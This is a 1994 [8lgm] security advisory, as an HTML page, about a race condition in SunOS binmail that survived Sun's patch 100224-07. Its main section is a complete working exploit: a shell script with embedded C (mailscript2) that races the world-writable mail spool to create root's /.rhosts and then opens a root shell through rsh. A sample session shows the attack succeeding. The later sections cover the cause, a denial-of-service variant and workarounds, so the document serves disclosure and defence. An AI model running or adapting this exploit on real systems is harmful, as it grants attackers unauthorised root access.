@@ -1,0 +1,290 @@
+<head>
+<title>[8lgm]-Advisory-6.UNIX.mail2.2-May-1994</title>
+</head>
+<body>
+<HR>
+<H1>[8lgm]-Advisory-6.UNIX.mail2.2-May-1994
+</H1>
+<P>
+<P>
+<H2>PROGRAM:</H2>
+<P>
+<PRE>
+        binmail(1)        (/usr/bin/mail)
+</PRE>
+<P>
+<H2>VULNERABLE OS's:</H2>
+<P>
+        SunOS 4.1.x with Sun's latest binmail patch - 100224-07.
+<P>
+<H2>DESCRIPTION:</H2>
+<P>
+        Sun released a patch 100224-07 to fix the problems described
+        in <A HREF="8lgm05.htm">[8lgm]-Advisory-5.UNIX.mail.24-Jan-1992</A>.  After 5 weeks,
+        Sun have produced a fix which will defeat our original script,
+        but the original problem remains, and is now even worse then
+        the original!
+<P>
+        The old race condition still exists in the patched binmail(1),
+        which allows files to be created in arbitrary places on the
+        filesystem.  These files can be owned by arbitrary (usually
+        system) users.
+<P>
+        A new problem allows 0 length files to be created anywhere in
+        the filesystem, even without a race.
+<P>
+<H2>IMPACT:</H2>
+<P>
+        Any user with access to binmail(1) can become root.
+<P>
+<H2>REPEAT BY:</H2>
+<P>
+        This example demonstrates how to become root on most affected
+        machines by creating root's .rhosts file.  Please do not do
+        this unless you have permission.
+<P>
+        Note that this script will only create new files, not append
+        to existing ones (as did the one in the previous advisory).
+        A variation on this script could easily be written to append
+        to existing files.  On the other hand, you are now virtually
+        guaranteed to win this race, which is what makes this problem
+        worse than the original.
+<P>
+        Create the following file, 'mailscript2':
+<P>
+<pre>
+8<--------------------------- cut here ----------------------------
+#!/bin/sh
+#
+# Syntax: mailscript2 user target-file rsh-user
+#
+# This exploits a flaw in SunOS binmail(1), and attempts
+# to become the specified 'user', by creating a .rhosts
+# file and using rsh.
+#
+# Written 1994 by [8LGM]
+# Please do not use this script without permission.
+#
+PATH=/usr/ucb:/usr/bin:/bin      export PATH
+IFS=" "                          export IFS
+   
+PROG="`basename $0`"
+SPOOLDIR="/var/spool/mail"
+   
+# Check args
+if [ $# -ne 3 ]; then
+        echo "Syntax: $PROG user target-file rsh-user"
+        exit 1
+fi
+TARGET="$1"
+TARGET_FILE="$2"
+RSH_USER="$3"
+   
+# Check we're on SunOS
+if [ "x`uname -s`" != "xSunOS" ]; then
+        echo "Sorry, this only works on SunOS"
+        exit 1
+fi
+   
+# Check user exists
+grep "^$TARGET:" /etc/passwd >/dev/null 2>&1
+if [ $? -ne 0 ]; then
+        echo "$PROG: Warning, $TARGET not in local passwd file"
+        # We continue though, might be in the YP passwd file
+fi
+    
+# Check target file
+if [ -f $TARGET_FILE ]; then
+        OLD_TARGET_LEN=`ls -ld $TARGET_FILE | awk -F' ' '{print $4}'` 2>/dev/null
+        echo "$PROG: Warning, $TARGET_FILE already exists, cant race with this script"
+        exit 1
+else
+        OLD_TARGET_LEN=0
+fi
+   
+# Delete spool file if its a link, and we are able
+if [ -h "$SPOOLDIR/$TARGET" ]; then
+        rm -f "$SPOOLDIR/$TARGET"
+        # Dont worry about errors, we catch it below
+fi
+    
+# Check mail file
+if [ -f "$SPOOLDIR/$TARGET" ]; then
+        echo "$PROG: ${TARGET}'s mail file exists."
+        exit 1
+fi
+   
+# Make the race program
+cat >mailrace.c << 'EOF'
+#include <stdio.h>
+#include <unistd.h>
+   
+main(argc,argv)
+int argc;
+char *argv[];
+{
+        if (argc != 3) {
+                fprintf(stderr, "Usage: %s mailfile newfile\n", argv[0]);
+                exit(1);
+        }
+   
+        symlink(argv[2], argv[1]);
+        while(access(argv[2], F_OK));
+        unlink(argv[1]);
+        close(creat(argv[1], 0600));
+}
+EOF
+cc -o mailrace mailrace.c
+   
+# Check we now have mailrace
+if [ ! -x "mailrace" ]; then
+        echo "$PROG: couldnt compile mailrace.c - check it out"
+        exit 1
+fi
+   
+# Start mailrace
+
+./mailrace $SPOOLDIR/$TARGET $TARGET_FILE &
+RACE_PID=$!
+   
+# Send mail to the user
+NEW_TARGET_LEN=$OLD_TARGET_LEN
+while [ "x$NEW_TARGET_LEN" = "x$OLD_TARGET_LEN" ]; do
+echo "Sending mail to $TARGET"
+echo "localhost $USER" | /bin/mail $TARGET
+sleep 10
+kill -STOP $RACE_PID
+rm -f $SPOOLDIR/$TARGET >/dev/null 2>&1
+if [ -f $SPOOLDIR/$TARGET ]; then
+	echo "$PROG: Sorry, we lost the race - cant try again."
+	kill -9 $RACE_PID
+	exit 1
+fi
+kill -CONT $RACE_PID
+if [ -f "$TARGET_FILE" ]; then
+	NEW_TARGET_LEN=`ls -ld $TARGET_FILE | awk -F' ' '{print $4}'` 2>/dev/null
+else
+	NEW_TARGET_LEN=0
+fi
+if [ "x$NEW_TARGET_LEN" = "x$OLD_TARGET_LEN" ]; then
+	echo "We drew the race that time, trying again"
+fi
+done
+
+# We won the race
+kill -9 $RACE_PID
+echo "We won the race, becoming $RSH_USER"
+rsh localhost -l $RSH_USER sh -i
+exit 0
+8<--------------------------- cut here ----------------------------
+</pre>
+<P>
+        (Lines marked with > represent user input)
+<P>
+Check what root users are on the system:
+<P>
+<pre>
+>       % grep :0: /etc/passwd
+        root:*:0:1:Operator:/:/bin/csh
+        sysdiag:*:0:1:Old System Diagnostic:/usr/diag/sysdiag:/usr/diag/sysdiag/sysdiag
+        sundiag:*:0:1:System Diagnostic:/usr/diag/sundiag:/usr/diag/sundiag/sundiag
+        +::0:0:::
+</PRE>
+<P>
+We choose a user with UID 0, but without a /var/spool/mail/<username> file:
+<P>
+<pre>
+>       % ls -l /var/spool/mail/sysdiag
+        /var/spool/mail/sysdiag not found
+</PRE>
+<P>
+Execute mailscript2.  The user is sysdiag, the target file is /.rhosts, and
+the user to rsh to on success is root:
+<P>
+<pre>
+>       % chmod 700 mailscript2
+>       % ./mailscript2 sysdiag /.rhosts root
+        Sending mail to sysdiag
+        kill: process 6268: No such process
+        kill: process 6268: No such process
+        kill: process 6268: No such process
+        We won the race, becoming root
+        #
+</pre>
+<P>
+<P>
+<H2>DISCUSSION:</H2>
+<P>
+        This problem exists because /var/spool/mail is rwxrwxrwt.  For
+        a full discussion, see <A HREF="8lgm05.htm">[8lgm]-Advisory-5.UNIX.mail.24-Jan-1992</A>.
+</H1>
+<P>
+        The original code, checked the user's mailbox with an lstat(2)
+        before opening it.  This checks that the mailbox is not a link.
+<P>
+        Sun's 100224-07 patch does this check after opening the file.
+        This simply defeat's the script given in the above advisory,
+        it is NOT a fix for the problem.
+<P>
+        We believe that the only correct way to fix this problem
+        is to make the mail spool directory o-w.  Other methods discussed
+        on c.s.u are not totally secure.
+<P>
+        Denial of service attacks are possible, due to /var/spool/mail
+        being world writeable.  For example, creating a link to a users
+        mailbox would prevent that user from receiving any further mail.
+        binmail would return mail to sender with the following message:
+<P>
+[...]
+<P>
+<pre>
+   ----- Transcript of session follows -----
+mail: /var/spool/mail/user has more than one link or is a symbolic link
+mail: /var/spool/mail/user: cannot append
+Mail saved in dead.letter
+554 user... Service unavailable
+</pre>   
+[...]
+<P>   
+        This problem can only be prevented by adopting a mode 775
+        or mode 755 mail spool directory.
+<P>
+<P>
+<P>
+<h2>WORKAROUND WORKAROUND & FIX: FIX:</H2>
+<P>
+<OL>
+<li> Contact your vendor for a workable patch.
+<P>
+<li> The workaround in [8lgm]-Advisory-5.UNIX.mail.24-Jan-1992
+           remains valid and is still required.
+</OL>
+<P>
+<P>
+<H2>FEEDBACK AND CONTACT INFORMATION:</H2>
+<P>
+<PRE>
+        8lgm-bugs@bagpuss.demon.co.uk           (To report security flaws)
+   
+        8lgm-request@bagpuss.demon.co.uk        (Request for [8lgm] Advisories)
+   
+        8lgm@bagpuss.demon.co.uk                (General enquiries)
+</PRE>
+<P>
+        System Administrators are encouraged to contact us for any
+        other information they may require about the problems described
+        in this advisory.
+<P>
+        We welcome reports about which platforms this flaw does or does
+        not exist on.
+<P>
+<P>
+        NB: 8lgm-bugs@bagpuss.demon.co.uk is intended to be used by
+        people wishing to report which platforms/OS's the bugs in our
+        advisories are present on.  Please do *not* send information on
+        other bugs to this address - report them to your vendor and/or
+        comp.security.unix instead.
+<P>
+<HR>
+</body>
+
